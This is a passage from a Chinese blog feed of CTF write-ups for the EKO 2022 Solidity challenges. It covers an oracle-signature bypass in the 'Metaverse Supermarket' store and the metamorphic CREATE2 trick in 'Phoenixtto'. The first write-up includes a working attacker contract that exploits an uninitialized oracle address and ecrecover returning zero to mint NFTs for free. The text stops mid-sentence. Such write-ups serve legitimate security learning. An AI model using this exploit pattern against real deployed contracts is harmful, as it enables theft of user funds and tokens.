oraclePrice.price);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">_mintMeal</span>(<span class="params">address buyer, uint256 price</span>) <span class="title">private</span> </span>&#123;</span><br><span class="line">        infla.transferFrom(buyer, address(<span class="keyword">this</span>), price);</span><br><span class="line">        meal.safeMint(buyer);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">_validateOraclePrice</span>(<span class="params">OraclePrice calldata oraclePrice, Signature calldata signature</span>) <span class="title">private</span> <span class="title">view</span> </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(block.number - oraclePrice.blockNumber &lt; BLOCK_RANGE, <span class="string">"price too old!"</span>);</span><br><span class="line"></span><br><span class="line">        bytes32 oracleHash = _hashOraclePrice(oraclePrice);</span><br><span class="line">        address recovered = _recover(oracleHash, signature.v, signature.r, signature.s);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">require</span>(recovered == oracle, <span class="string">"not oracle!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">_recover</span>(<span class="params">bytes32 digest, uint8 v, bytes32 r, bytes32 s</span>) <span class="title">internal</span> <span class="title">pure</span> <span class="title">returns</span> (<span class="params">address</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(v == <span class="number">27</span> || v == <span class="number">28</span>, <span class="string">"invalid v!"</span>);</span><br><span class="line">        <span class="keyword">return</span> ecrecover(digest, v, r, s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"solmate/tokens/ERC721.sol"</span>;</span><br><span class="line"></span><br><span class="line">contract Meal is ERC721(<span class="string">"Meal"</span>, <span class="string">"MEAL"</span>) &#123;</span><br><span class="line">    address private immutable _owner;</span><br><span class="line">    uint256 private _tokenIdCounter;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">constructor</span>() &#123;</span><br><span class="line">        _owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">safeMint</span>(<span class="params">address to</span>) <span class="title">external</span> </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(_owner == msg.sender, <span class="string">"Only owner can mint"</span>);</span><br><span class="line">        uint256 tokenId = _tokenIdCounter;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            ++_tokenIdCounter;</span><br><span class="line">        &#125;</span><br><span class="line">        _safeMint(to, tokenId);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">tokenURI</span>(<span class="params">uint256</span>) <span class="title">public</span> <span class="title">pure</span> <span class="title">override</span> <span class="title">returns</span> (<span class="params">string memory</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"ipfs://QmQqCFY7Dt9SFgadayt8eeTr7i5XauiswxeLysexbymGp1"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"solmate/tokens/ERC20.sol"</span>;</span><br><span class="line"></span><br><span class="line">contract Infla is ERC20(<span class="string">"INFLA"</span>, <span class="string">"INF"</span>, <span class="number">18</span>) &#123;</span><br><span class="line">    <span class="keyword">constructor</span>(address player, uint256 amount) &#123;</span><br><span class="line">        _mint(player, amount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通读一遍后，这个challange大概是由一个Store合约、一个ERC20和一个ERC721构成，题目很清楚。接下来关注Factory：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">deploy</span>(<span class="params">address _player</span>) <span class="title">external</span> <span class="title">payable</span> <span class="title">override</span> <span class="title">returns</span> (<span class="params">address[] memory ret</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.value == <span class="number">0</span>, <span class="string">"dont send ether"</span>);</span><br><span class="line">        address _challenge = address(<span class="keyword">new</span> InflaStore(_player));</span><br><span class="line"></span><br><span class="line">        ret = <span class="keyword">new</span> address[](<span class="number">1</span>);</span><br><span class="line">        ret[<span class="number">0</span>] = _challenge;</span><br><span class="line">        _challengePlayer[_challenge] = _player;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isComplete</span>(<span class="params">address[] calldata _challenges</span>) <span class="title">external</span> <span class="title">view</span> <span class="title">override</span> <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> IERC721(address(InflaStore(_challenges[<span class="number">0</span>]).meal())).balanceOf(_challengePlayer[_challenges[<span class="number">0</span>]]) &gt;= <span class="number">10</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Challange的目的是要我们想办法获得10个NFT，但store中明码标价10e6一个，而穷酸的我们只拥有10wei，（看来钱不是万能的，技术才是硬道理hhhh）</p><p>这里我们注意到一个关键点：store里面有个预言机初始化函数<code>setOracle</code>，但在factory中并没有调用这个函数，导致store里的预言机地址是没有初始化的。so我们来看看store里的价格预言机购买函数：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_validateOraclePrice</span>(<span class="params">OraclePrice calldata oraclePrice, Signature calldata signature</span>) <span class="title">private</span> <span class="title">view</span> </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(block.number - oraclePrice.blockNumber &lt; BLOCK_RANGE, <span class="string">"price too old!"</span>);</span><br><span class="line"></span><br><span class="line">        bytes32 oracleHash = _hashOraclePrice(oraclePrice);</span><br><span class="line">        address recovered = _recover(oracleHash, signature.v, signature.r, signature.s);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">require</span>(recovered == oracle, <span class="string">"not oracle!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">_recover</span>(<span class="params">bytes32 digest, uint8 v, bytes32 r, bytes32 s</span>) <span class="title">internal</span> <span class="title">pure</span> <span class="title">returns</span> (<span class="params">address</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(v == <span class="number">27</span> || v == <span class="number">28</span>, <span class="string">"invalid v!"</span>);</span><br><span class="line">        <span class="keyword">return</span> ecrecover(digest, v, r, s);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>_validateOraclePrice()</code>中通过签名检查价格是否是预言机所签名的价格，来执行交易。在这里我们要知道</p><p><code>ecrecover</code>在参数错误的情况下是会返回0的。一旦oracle地址没有初始化，这里会出现漏洞，任何人都可以跳过检查以自己想要的价格买入NFT。</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line"></span><br><span class="line">pragma solidity <span class="number">0.8</span><span class="number">.17</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"../ChallengeMetaverseSupermarket.sol"</span>;</span><br><span class="line"></span><br><span class="line">contract ChallengeMetaverseSupermarketAttacker &#123;</span><br><span class="line">    <span class="keyword">constructor</span>(address target) &#123;</span><br><span class="line">        InflaStore inflaStore = InflaStore(target);</span><br><span class="line">        Meal meal = inflaStore.meal();</span><br><span class="line"></span><br><span class="line">        OraclePrice memory price = OraclePrice(block.number, <span class="number">0</span>);</span><br><span class="line">        Signature memory signature = Signature(<span class="number">27</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (uint256 i; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">            inflaStore.buyUsingOracle(price, signature);</span><br><span class="line">            meal.transferFrom(address(<span class="keyword">this</span>), msg.sender, i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总的来说，这个题两个关键点：</p><ul><li>一个是初始化函数setOracle没有被调用</li><li>没有对ercrecover进行0值判断</li></ul>]]></content>
      
      
      <categories>
          
          <category> EKO </category>
          
      </categories>
      
      
        <tags>
            
            <tag> EKO </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-EKO-Phoenixtto</title>
      <link href="/EKO-Phoenixtto/"/>
      <url>/EKO-Phoenixtto/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-EKO-Phoenixtto"><a href="#CTF-EKO-Phoenixtto" class="headerlink" title="CTF-EKO-Phoenixtto"></a>CTF-EKO-Phoenixtto</h1><hr><pre><code>author：Thomas_Xu</code></pre><p>从今天开始更新CTF-EKO系列，这貌似是<code>ethernaut</code>靶场的研发团队举办的一个CTF。</p><p>题目链接：<a href="https://www.ctfprotocol.com/tracks/eko2022/phoenixtto" target="_blank" rel="noopener">https://www.ctfprotocol.com/tracks/eko2022/phoenixtto</a></p><p>先来看第一个题：</p><blockquote><p>在跨界世界中，有一个特殊的跨界世界，口袋妖怪、哈利波特和 solidity 的宇宙交织在一起。在这个交叉中，在邓布利多的凤凰之间创造了一个混合生物，一个野生的同上，因为我们在固体宇宙中，这个生物是一个合同。我们称它为 Phoenixtto，它有两个重要的能力，一个是在它被破坏后从它的灰烬中重生，另一个是复制另一个字节码的行为。<br>如果可以，请尝试捕获 Phhoenixtto…</p></blockquote><p>这个题目描述还挺有意思，不过也给了我一点思路，<code>灰烬中重生``复制字节码</code>听上去很有意思，难道和<code>selfdestroy</code>有关？</p><p>还是先来看代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity <span class="number">0.8</span><span class="number">.17</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *     <span class="doctag">@title <span class="variable">Phoenixtto</span></span></span></span><br><span class="line"><span class="comment"> *     <span class="doctag">@author </span>Rotcivegaf https://twitter.com/victor93389091 &lt;victorfage<span class="doctag">@gmail</span>.com&gt;</span></span><br><span class="line"><span class="comment"> *     <span class="doctag">@dev </span>Within the world of crossovers there is a special one, where the universes of pokemon,</span></span><br><span class="line"><span class="comment"> *         harry potter and solidity intertwine.</span></span><br><span class="line"><span class="comment"> *         In this crossover a mix creature is created between dumbledore's phoenix, a wild ditto and</span></span><br><span class="line"><span class="comment"> *         since we are in the solidity universe this creature is a contract.</span></span><br><span class="line"><span class="comment"> *         We have called it Phoenixtto and it has two important abilities, that of being reborn from</span></span><br><span class="line"><span class="comment"> *         it's ashes after its destruction and that of copying the behavior of another bytecode</span></span><br><span class="line"><span class="comment"> *         Try to capture the Phoenixtto, if you can...</span></span><br><span class="line"><span class="comment"> *     <span class="doctag">@custom</span>:url https://www.ctfprotocol.com/tracks/eko2022/phoenixtto</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">contract Laboratory &#123;</span><br><span class="line">    address immutable PLAYER;</span><br><span class="line">    address public getImplementation;</span><br><span class="line">    address public addr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">constructor</span>(address _player) &#123;</span><br><span class="line">        PLAYER = _player;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">mergePhoenixDitto</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        reBorn(type(Phoenixtto).creationCode);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">reBorn</span>(<span class="params">bytes memory _code</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        address x;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            x := create(<span class="number">0</span>, add(<span class="number">0x20</span>, _code), mload(_code))</span><br><span class="line">        &#125;</span><br><span class="line">        getImplementation = x;</span><br><span class="line"></span><br><span class="line">        _code = hex<span class="string">"5860208158601c335a63aaf10f428752fa158151803b80938091923cf3"</span>;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            x := create2(<span class="number">0</span>, add(_code, <span class="number">0x20</span>), mload(_code), <span class="number">0</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        addr = x;</span><br><span class="line">        Phoenixtto(x).reBorn();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">isCaught</span>(<span class="params"></span>) <span class="title">external</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Phoenixtto(addr).owner() == PLAYER;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Phoenixtto &#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    bool private _isBorn;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">reBorn</span>(<span class="params"></span>) <span class="title">external</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (_isBorn) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        _isBorn = <span class="literal">true</span>;</span><br><span class="line">        owner = address(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">capture</span>(<span class="params">string memory _newOwner</span>) <span class="title">external</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!_isBorn || msg.sender != tx.origin) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        address newOwner = address(uint160(uint256(keccak256(abi.encodePacked(_newOwner)))));</span><br><span class="line">        <span class="keyword">if</span> (newOwner == msg.sender) &#123;</span><br><span class="line">            owner = newOwner;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            selfdestruct(payable(msg.sender));</span><br><span class="line">            _isBorn = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>粗略一读代码，这里出现了Create2和selfdestruct，结合题目的暗示，我估计玄机就在此处。</p><p>但？这二者有什么联系吗？</p><p>先不管了，看看Factory吧，因为Factory能看到判题标准，我们目标才能更明确。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">deploy</span>(<span class="params">address _player</span>) <span class="title">external</span> <span class="title">payable</span> <span class="title">override</span> <span class="title">returns</span> (<span class="params">address[] memory ret</span>) </span>&#123;</span><br><span class="line">       <span class="built_in">require</span>(msg.value == <span class="number">0</span>, <span class="string">"dont send ether"</span>);</span><br><span class="line">       address _challenge = address(<span class="keyword">new</span> Laboratory(_player));</span><br><span class="line">       Laboratory(_challenge).mergePhoenixDitto();</span><br><span class="line">       ret = <span class="keyword">new</span> address[](<span class="number">1</span>);</span><br><span class="line">       ret[<span class="number">0</span>] = _challenge;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">isComplete</span>(<span class="params">address[] calldata _challenges</span>) <span class="title">external</span> <span class="title">view</span> <span class="title">override</span> <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">       <span class="comment">// @dev to win this challenge you must drain the contract</span></span><br><span class="line">       Laboratory _target = Laboratory(_challenges[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> _target.isCaught();</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>这里只帖出来<code>deploy</code>和<code>isComplete</code>就够了，从Factory我们可以了解到这个题只需要<code>isCaught</code>返回true即可。</p><p>也就是说要Phoenixtto的owner变为我们自己。那很自然而然地，唯一显式修改owner的地方在capture里。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">`function capture(string memory _newOwner) external &#123;</span></span><br><span class="line"><span class="string">        if (!_isBorn || msg.sender != tx.origin) return;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        address newOwner = address(uint160(uint256(keccak256(abi.encodePacked(_newOwner)))));</span></span><br><span class="line"><span class="string">        if (newOwner == msg.sender) &#123;</span></span><br><span class="line"><span class="string">            owner = newOwner;</span></span><br><span class="line"><span class="string">        &#125; else &#123;</span></span><br><span class="line"><span class="string">            selfdestruct(payable(msg.sender));</span></span><br><span class="line"><span class="string">            _isBorn = false;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br></pre></td></tr></table></figure><p>这里要进入要修改owner的判断，其实并不复杂。</p><p>先来看看这个newOwner倒是是个啥吧：<code>address newOwner = address(uint160(uint256(keccak256(abi.encodePacked(_newOwner)))));</code></p><p>如果熟悉以太坊账户的生成流程的话，应该很快就能看出来这里就是一个公钥到地址的一个转换，取了公钥哈希的最后20个字节。</p><p>那这个题就太简单了，只需要把自己公钥传进去就解题了。</p><p>这个点可能是EKO故意出的一个“签到题”，但其实这个题深入研究的话，还有一个真正的漏洞。</p><p>不难发现reBorn函数是比较关键的，我们重点分析：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">reBorn</span>(<span class="params">bytes memory _code</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        address x;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            x := create(<span class="number">0</span>, add(<span class="number">0x20</span>, _code), mload(_code))</span><br><span class="line">        &#125;</span><br><span class="line">        getImplementation = x;</span><br><span class="line"></span><br><span class="line">        _code = hex<span class="string">"5860208158601c335a63aaf10f428752fa158151803b80938091923cf3"</span>;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            x := create2(<span class="number">0</span>, add(_code, <span class="number">0x20</span>), mload(_code), <span class="number">0</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        addr = x;</span><br><span class="line">        Phoenixtto(x).reBorn();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">isCaught</span>(<span class="params"></span>) <span class="title">external</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Phoenixtto(addr).owner() == PLAYER;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>第一部分是Create，从Factory的调用可知，这里创建了Phoenixtto实例。该地址随后存储在状态变量中<code>getImplementation</code></p><p>第二部分是个Create2，emmm这里用一串十六进制数重新赋值了code，看上去像是操作码，而Create2使用了这段操作码来初始化合约？这让我陷入短暂迷惑。</p><p>必须是一些有效的字节码，否则操作<code>create2</code>会失败，对吧？</p><p>但是，这些字节码究竟是什么意义？我在EVM playground上模拟了一下，这一串字节码节码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 0x5860208158601c335a63aaf10f428752fa158151803b80938091923cf3</span><br><span class="line">*</span><br><span class="line">* pc|op|name         | [stack]                                | &lt;memory&gt;</span><br><span class="line">*</span><br><span class="line">* ** 将第一个堆栈项设置为零 **</span><br><span class="line">* 00 58 getpc          [0]                                       &lt;&gt;</span><br><span class="line">*</span><br><span class="line">* ** 将第二个堆栈项设置为32，将是staticcall的长度参数 **</span><br><span class="line">* 01 60 push1</span><br><span class="line">* 02 20 outsize        [0, 32]                                   &lt;&gt;</span><br><span class="line">*</span><br><span class="line">* ** 将第三个堆栈项设置为0，将是staticcall的position参数 **</span><br><span class="line">* 03 81 dup2           [0, 32, 0]                                &lt;&gt;</span><br><span class="line">*</span><br><span class="line">* ** 将第四个堆栈项设置为4，将是staticcall的选择器长度参数 **</span><br><span class="line">* 04 58 getpc          [0, 32, 0, 4]                             &lt;&gt;</span><br><span class="line">*</span><br><span class="line">* ** 将第五个堆栈项设置为28，将是staticcall的选择器的position参数 **</span><br><span class="line">* 05 60 push1</span><br><span class="line">* 06 1c inpos          [0, 32, 0, 4, 28]                         &lt;&gt;</span><br><span class="line">*</span><br><span class="line">* ** 将第六个堆栈项设置为msg.sender，staticcall的目标地址 **</span><br><span class="line">* 07 33 caller         [0, 32, 0, 4, 28, caller]                 &lt;&gt;</span><br><span class="line">*</span><br><span class="line">* ** 讲第七个堆栈项设置为msg.gas, staticcall的gas限制 **</span><br><span class="line">* 08 5a gas            [0, 32, 0, 4, 28, caller, gas]            &lt;&gt;</span><br><span class="line">*</span><br><span class="line">* ** 将第八个堆栈项设置为选择器，通过mstore存储“what” **</span><br><span class="line">* 09 63 push4</span><br><span class="line">* 10 aaf10f42 selector [0, 32, 0, 4, 28, caller, gas, 0xaaf10f42]    &lt;&gt;</span><br><span class="line">*</span><br><span class="line">* ** 将第九个堆栈项设置为0，“where”通过mstore存储 ***</span><br><span class="line">* 11 87 dup8           [0, 32, 0, 4, 28, caller, gas, 0xaaf10f42, 0] &lt;&gt;</span><br><span class="line">*</span><br><span class="line">* ** 调用mstore，从堆栈中消耗8和9，将选择器放在内存中 **</span><br><span class="line">* 12 52 mstore         [0, 32, 0, 4, 0, caller, gas]             &lt;0xaaf10f42&gt;</span><br><span class="line">*</span><br><span class="line">* ** 调用staiccall，使用堆栈2到7，将地址放在内存中 **</span><br><span class="line">* 13 fa staticcall     [0, 1 (if successful)]                    &lt;address&gt;</span><br><span class="line">*</span><br><span class="line">* ** 将第二个堆栈项中的成功位翻转为0 **</span><br><span class="line">* 14 15 iszero         [0, 0]                                    &lt;address&gt;</span><br><span class="line">*</span><br><span class="line">* ** 将第三个0推送到堆栈，地址在内存中的位置 **</span><br><span class="line">* 15 81 dup2           [0, 0, 0]                                 &lt;address&gt;</span><br><span class="line">*</span><br><span class="line">* ** 将地址从内存中的位置放到第三个堆栈项上 **</span><br><span class="line">* 16 51 mload          [0, 0, address]                           &lt;&gt;</span><br><span class="line">*</span><br><span class="line">* ** 将地址放置到要使用的extcodesize的第四个堆栈项 **</span><br><span class="line">* 17 80 dup1           [0, 0, address, address]                  &lt;&gt;</span><br><span class="line">*</span><br><span class="line">* ** 获取extcodecopy的第四个堆栈项的extcodesize **</span><br><span class="line">* 18 3b extcodesize    [0, 0, address, size]                     &lt;&gt;</span><br><span class="line">*</span><br><span class="line">* ** dup和swap大小，供init代码末尾的返回使用 **</span><br><span class="line">* 19 80 dup1           [0, 0, address, size, size]               &lt;&gt; </span><br><span class="line">* 20 93 swap4          [size, 0, address, size, 0]               &lt;&gt;</span><br><span class="line">*</span><br><span class="line">* ** 将代码位置0推送到extcodecopy的堆栈和重新排序堆栈项 **</span><br><span class="line">* 21 80 dup1           [size, 0, address, size, 0, 0]            &lt;&gt;</span><br><span class="line">* 22 91 swap2          [size, 0, address, 0, 0, size]            &lt;&gt;</span><br><span class="line">* 23 92 swap3          [size, 0, size, 0, 0, address]            &lt;&gt;</span><br><span class="line">*</span><br><span class="line">* ** 调用extcodecopy，使用四项，将运行时代码克隆到内存 **</span><br><span class="line">* 24 3c extcodecopy    [size, 0]                                 &lt;code&gt;</span><br><span class="line">*</span><br><span class="line">* ** 返回以在内存中部署最终代码 **</span><br><span class="line">* 25 f3 return         []                                        *deployed!*</span><br></pre></td></tr></table></figure><p>这里其实是有关Metamorphic Contracts的应用，相关链接：</p><ul><li><p>0age<a href="https://0age.medium.com/the-promise-and-the-peril-of-metamorphic-contracts-9eb8b8413c5e" target="_blank" rel="noopener">变质合约的承诺与危险</a></p></li><li><p>在Jason Carver 的<a href="https://medium.com/@jason.carver/defend-against-wild-magic-in-the-next-ethereum-upgrade-b008247839d2" target="_blank" rel="noopener">下一次以太坊升级中抵御“狂野魔法”</a></p></li><li><p>Metamorphic —由 0age<a href="https://github.com/0age/metamorphic" target="_blank" rel="noopener">创建变形（即可重新部署）合约的工厂合约</a></p></li><li><p>来自 a16zcrypto 的 Michael Blau 的<a href="https://a16zcrypto.com/metamorphic-smart-contract-detector-tool/" target="_blank" rel="noopener">检测变形智能合约的工具</a></p></li></ul><p>这个概念背后的想法是能够更改合约中的代码并使其变形为其他东西。这利用了这样一个事实，即给定相同的输入，CREATE2 